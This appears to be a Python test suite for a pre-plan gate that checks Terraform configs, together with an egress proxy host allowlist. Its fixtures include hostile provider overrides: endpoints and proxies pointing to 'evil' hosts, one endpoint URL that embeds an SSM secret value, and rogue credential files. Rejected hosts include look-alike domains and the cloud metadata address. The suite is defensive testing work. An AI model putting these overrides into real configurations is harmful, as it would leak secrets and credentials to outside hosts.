"""Tests for scripts/check_tf_config.py (static pre-plan gate, Guardian M2)."""
import importlib.util
import json
import os
import tempfile
import textwrap
import unittest
from contextlib import redirect_stderr, redirect_stdout
from io import StringIO
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("check_tf_config", ROOT / "scripts" / "check_tf_config.py")
ctc = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ctc)

GOOD_ROOT = '''
# endpoints { } in a comment is fine
terraform {
  required_version = ">= 1.10"
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 6.0" }
  }
  backend "s3" {
    bucket       = "shc-tfstate"
    key          = "prod/terraform.tfstate"
    region       = "eu-west-2"
    profile      = "shc"
    encrypt      = true
    use_lockfile = true
  }
}

provider "aws" {
  region              = var.region
  profile             = var.aws_profile
  allowed_account_ids = [var.account_id]
  default_tags {
    tags = { Project = "x", Note = "braces { } and \\"quotes\\" in ${var.a}" }
  }
}

provider "aws" {
  alias   = "us_east_1"
  region  = "us-east-1"
  profile = "shc"
}

locals {
  doc = <<-EOT
    provider "aws" { endpoints { s3 = "http://evil" } }
  EOT
  m = { for k, v in var.x : k => v if v != "" }
  esc = "$${not_interpolated}"
}

module "site" {
  source = "./modules/site"
  name   = "a"
}
'''

GOOD_MODULE = '''
resource "aws_s3_bucket" "b" {
  bucket = "x"
}
'''


class TfConfigTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = self.tmp.name
        self.write("infra/main.tf", GOOD_ROOT)
        self.write("infra/modules/site/main.tf", GOOD_MODULE)

    def tearDown(self):
        self.tmp.cleanup()

    def write(self, rel, text):
        p = os.path.join(self.root, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as f:
            f.write(textwrap.dedent(text))

    def check(self, profile="shc"):
        return ctc.check(self.root, "infra", profile)

    def add(self, text, rel="infra/extra.tf"):
        self.write(rel, text)
        return self.check()

    def test_good_config(self):
        self.assertEqual(self.check(), [])

    def test_provider_overrides_refused(self):
        cases = {
            "endpoints": 'endpoints {\n s3 = "https://x.example/${data.aws_ssm_parameter.p.value}"\n}',
            "custom_ca_bundle": 'custom_ca_bundle = "/tmp/ca.pem"',
            "http_proxy": 'http_proxy = "http://evil:3128"',
            "https_proxy": 'https_proxy = "http://evil:3128"',
            "no_proxy": 'no_proxy = "*"',
            "sts_region": 'sts_region = "us-east-1"',
            "skip_credentials_validation": "skip_credentials_validation = true",
            "skip_requesting_account_id": "skip_requesting_account_id = true",
            "insecure": "insecure = true",
            "assume_role": 'assume_role {\n role_arn = "arn:aws:iam::1:role/x"\n}',
            "assume_role_with_web_identity": 'assume_role_with_web_identity {\n role_arn = "x"\n}',
            "shared_config_files": 'shared_config_files = ["/tmp/evil"]',
            "shared_credentials_files": 'shared_credentials_files = ["/tmp/evil"]',
            "access_key": 'access_key = "AKIA..."',
            "ec2_metadata_service_endpoint": 'ec2_metadata_service_endpoint = "http://x"',
        }
        for name, body in cases.items():
            problems = self.add(f'provider "aws" {{\n alias = "x"\n region = "eu-west-2"\n {body}\n}}\n')
            self.assertTrue(any(name in p for p in problems), (name, problems))

    def test_default_tags_only_tags(self):
        problems = self.add('provider "aws" {\n alias = "y"\n default_tags {\n endpoint = "x"\n }\n}\n')
        self.assertTrue(problems)

    def test_profile_rules(self):
        self.assertTrue(self.add('provider "aws" {\n alias = "p"\n profile = "other"\n}\n'))
        self.assertTrue(self.add('provider "aws" {\n alias = "p"\n profile = "shc-${var.x}"\n}\n'))
        self.assertTrue(self.add('provider "aws" {\n alias = "p"\n profile = lookup(var.m, "a")\n}\n'))
        self.assertEqual(self.add('provider "aws" {\n alias = "p"\n profile = "shc"\n}\n'), [])
        self.assertEqual(self.add('provider "aws" {\n alias = "p"\n profile = var.p\n}\n'), [])

    def test_other_providers(self):
        self.assertTrue(self.add('provider "external" {}\n'))
        self.assertTrue(self.add('provider "http" {}\n'))
        self.assertTrue(self.add('provider "random" {\n some = "x"\n}\n'))
        self.assertEqual(self.add('provider "random" {\n alias = "r"\n}\n'), [])

    def test_backend_rules(self):
        self.assertTrue(self.add('terraform {\n backend "s3" {\n endpoints = { s3 = "http://x" }\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n backend "s3" {\n https_proxy = "http://x"\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n backend "s3" {\n profile = "other"\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n backend "http" {\n address = "https://x"\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n cloud {\n organization = "x"\n }\n}\n'))
        self.assertTrue(self.add('terraform {\n provider_meta "aws" {}\n}\n'))

    def test_nested_local_module_checked(self):
        self.write("infra/modules/site/p.tf", 'provider "aws" {\n endpoints {\n sts = "https://x"\n }\n}\n')
        problems = self.check()
        self.assertTrue(any("modules/site/p.tf" in p and "endpoints" in p for p in problems), problems)

    def test_remote_or_escaping_modules(self):
        self.assertTrue(self.add('module "m" {\n source = "git::https://example.com/m.git"\n}\n'))
        self.assertTrue(self.add('module "m" {\n source = "hashicorp/consul/aws"\n}\n'))
        self.assertTrue(self.add('module "m" {\n source = "${path.module}/x"\n}\n'))
        outside = os.path.join(os.path.dirname(self.root), "outside-" + os.path.basename(self.root))
        os.makedirs(outside, exist_ok=True)
        self.addCleanup(os.rmdir, outside)
        problems = self.add(f'module "m" {{\n source = "../../outside-{os.path.basename(self.root)}"\n}}\n')
        self.assertTrue(any("outside the repository" in p for p in problems), problems)

    def test_json_syntax(self):
        self.write("infra/x.tf.json", json.dumps({"provider": {"aws": [{"alias": "j", "endpoints": {"s3": "http://x"}}]}}))
        self.assertTrue(any("endpoints" in p for p in self.check()))
        self.write("infra/x.tf.json", json.dumps({"terraform": {"backend": {"s3": {"insecure": True}}}}))
        self.assertTrue(any("insecure" in p for p in self.check()))
        self.write("infra/x.tf.json", json.dumps({"module": {"m": {"source": "git::https://x"}}}))
        self.assertTrue(self.check())
        self.write("infra/x.tf.json", json.dumps({"provider": {"aws": {"alias": "ok", "profile": "shc"}}}))
        self.assertEqual(self.check(), [])

    def test_unparseable_fails_closed(self):
        self.write("infra/bad.tf", 'provider "aws" {\n region = "x"\n')
        with redirect_stderr(StringIO()), redirect_stdout(StringIO()):
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 2)
        self.write("infra/bad.tf", 'locals {\n a = "unterminated\n}\n')
        with redirect_stderr(StringIO()), redirect_stdout(StringIO()):
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 2)

    def test_cli(self):
        with redirect_stdout(StringIO()), redirect_stderr(StringIO()):
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 0)
        self.add('provider "aws" {\n custom_ca_bundle = "x"\n}\n')
        with redirect_stdout(StringIO()), redirect_stderr(StringIO()) as err:
            self.assertEqual(ctc.main(["--root", self.root, "--tf-dir", "infra", "--profile", "shc"]), 1)
        self.assertIn("custom_ca_bundle", err.getvalue())


class EgressProxyRulesTest(unittest.TestCase):
    def setUp(self):
        spec2 = importlib.util.spec_from_file_location("egress_proxy", ROOT / "scripts" / "egress_proxy.py")
        self.ep = importlib.util.module_from_spec(spec2)
        spec2.loader.exec_module(self.ep)

    def test_host_allowlist(self):
        for h in ("sts.amazonaws.com", "s3.eu-west-2.amazonaws.com", "lambda.eu-west-2.amazonaws.com",
                  "registry.terraform.io", "releases.hashicorp.com", "STS.AMAZONAWS.COM."):
            self.assertTrue(self.ep.host_allowed(h), h)
        for h in ("example.com", "amazonaws.com.evil.example", "evilamazonaws.com", "registry.terraform.io.evil",
                  "169.254.169.254", "localhost", "x..amazonaws.com", "-x.amazonaws.com"):
            self.assertFalse(self.ep.host_allowed(h), h)

    def test_connect_parsing_and_addresses(self):
        self.assertEqual(self.ep.parse_connect(b"CONNECT sts.amazonaws.com:443 HTTP/1.1\r\n\r\n"),
                         ("sts.amazonaws.com", 443))
        self.assertIsNone(self.ep.parse_connect(b"GET http://x/ HTTP/1.1\r\n\r\n"))
        self.assertIsNone(self.ep.parse_connect(b"CONNECT a b:443 HTTP/1.1\r\n\r\n"))
        self.assertFalse(self.ep.global_address("169.254.169.254"))
        self.assertFalse(self.ep.global_address("10.1.2.3"))
        self.assertFalse(self.ep.global_address("127.0.0.1"))
        self.assertFalse(self.ep.global_address("::ffff:127.0.0.1"))
        self.assertTrue(self.ep.global_address("52.94.0.1"))


if __name__ == "__main__":
    unittest.main()
